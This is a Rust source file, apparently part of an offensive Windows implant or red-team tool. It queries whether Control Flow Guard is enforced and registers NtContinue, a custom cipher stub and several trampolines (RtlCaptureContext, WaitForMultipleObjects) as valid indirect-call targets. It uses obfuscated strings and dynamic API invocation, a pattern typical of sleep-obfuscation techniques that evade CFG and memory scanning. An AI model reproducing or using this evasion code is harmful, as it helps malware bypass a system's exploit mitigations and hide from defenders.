use alloc::string::String;
use core::{ffi::c_void, ptr::null_mut};

use obfstr::{obfstring as s};
use anyhow::{Context, Result, bail};
use dinvk::winapis::{NtCurrentProcess, NT_SUCCESS};
use dinvk::helper::PE;

use crate::config::Config;
use crate::winapis::{
    NtQueryInformationProcess, 
    SetProcessValidCallTargets
};
use crate::types::{
    CFG_CALL_TARGET_INFO, 
    EXTENDED_PROCESS_INFORMATION
};

/// CFG_CALL_TARGET_VALID flag indicating a valid indirect call target.
const CFG_CALL_TARGET_VALID: usize = 1;

/// Used internally by Windows to identify per-process CFG state.
const PROCESS_COOKIE: u32 = 36;

/// Used for combining with ProcessCookie to retrieve CFG policy.
const PROCESS_USER_MODE_IOPL: u32 = 16;

/// Mitigation policy ID for Control Flow Guard (CFG)
const ProcessControlFlowGuardPolicy: i32 = 7i32;

/// Checks if Control Flow Guard (CFG) is enabled for the current process.
pub fn is_cfg_enforced() -> Result<bool> {
    let mut proc_info = EXTENDED_PROCESS_INFORMATION {
        ExtendedProcessInfo: ProcessControlFlowGuardPolicy as u32,
        ..Default::default()
    };

    let status = NtQueryInformationProcess(
        NtCurrentProcess(),
        PROCESS_COOKIE | PROCESS_USER_MODE_IOPL,
        &mut proc_info as *mut _ as *mut c_void,
        size_of::<EXTENDED_PROCESS_INFORMATION>() as u32,
        null_mut(),
    );

    if !NT_SUCCESS(status) {
        bail!(s!("NtQueryInformationProcess Failed"));
    }

    Ok(proc_info.ExtendedProcessInfoBuffer != 0)
}

/// Adds a valid CFG call target for the given module base and target function.
pub fn add_cfg(module: usize, function: usize) -> Result<()> {
    unsafe {
        let nt_header = PE::parse(module as *mut c_void)
            .nt_header()
            .context(s!("invalid nt header"))?;

        // Memory range to apply the CFG policy
        let size = ((*nt_header).OptionalHeader.SizeOfImage as usize + 0xFFF) & !0xFFF;

        // Describe the valid call target
        let mut cfg = CFG_CALL_TARGET_INFO {
            Flags: CFG_CALL_TARGET_VALID,
            Offset: function - module,
        };

        // Apply the new valid call target
        if SetProcessValidCallTargets(
            NtCurrentProcess(), 
            module as *mut c_void, 
            size, 
            1, 
            &mut cfg
        ) == 0 
        {
            bail!(s!("SetProcessValidCallTargets Failed"))
        }
    }

    Ok(())
}

/// Adds a valid CFG call target for a standalone allocation (not backed by a PE module).
/// Uses page-aligned base and page-sized region for SetProcessValidCallTargets.
pub fn add_cfg_standalone(function: usize) -> Result<()> {
    let page_base = function & !0xFFF;
    let offset = function - page_base;
    let size = 0x1000; // single page

    let mut cfg_info = CFG_CALL_TARGET_INFO {
        Flags: CFG_CALL_TARGET_VALID,
        Offset: offset,
    };

    if SetProcessValidCallTargets(
        NtCurrentProcess(),
        page_base as *mut c_void,
        size,
        1,
        &mut cfg_info
    ) == 0
    {
        bail!(s!("SetProcessValidCallTargets (standalone) Failed"))
    }

    Ok(())
}

/// Registers known indirect call targets with Control Flow Guard (CFG).
pub fn register_cfg_targets(cfg: &Config) {
    let targets = [(cfg.modules.ntdll, cfg.nt_continue)];
    for (module, func) in targets {
        if let Err(e) = add_cfg(module.as_u64() as usize, func.as_u64() as usize) {
            if cfg!(debug_assertions) {
                dinvk::println!("add_cfg failed: {e}");
            }
        }
    }

    // Register custom cipher stub as valid CFG target
    if cfg.custom_encrypt != 0 {
        if let Err(e) = add_cfg_standalone(cfg.custom_encrypt as usize) {
            if cfg!(debug_assertions) {
                dinvk::println!("add_cfg_standalone (cipher stub) failed: {e}");
            }
        }
    }

    // Register callback trampoline as valid CFG target
    if cfg.callback != 0 {
        if let Err(e) = add_cfg_standalone(cfg.callback as usize) {
            if cfg!(debug_assertions) {
                dinvk::println!("add_cfg_standalone (callback) failed: {e}");
            }
        }
    }

    // Register RtlCaptureContext trampoline as valid CFG target
    if cfg.trampoline != 0 {
        if let Err(e) = add_cfg_standalone(cfg.trampoline as usize) {
            if cfg!(debug_assertions) {
                dinvk::println!("add_cfg_standalone (trampoline) failed: {e}");
            }
        }
    }

    // Register WFMO trampoline as valid CFG target
    if cfg.wfmo_trampoline != 0 {
        if let Err(e) = add_cfg_standalone(cfg.wfmo_trampoline as usize) {
            if cfg!(debug_assertions) {
                dinvk::println!("add_cfg_standalone (wfmo_trampoline) failed: {e}");
            }
        }
    }
}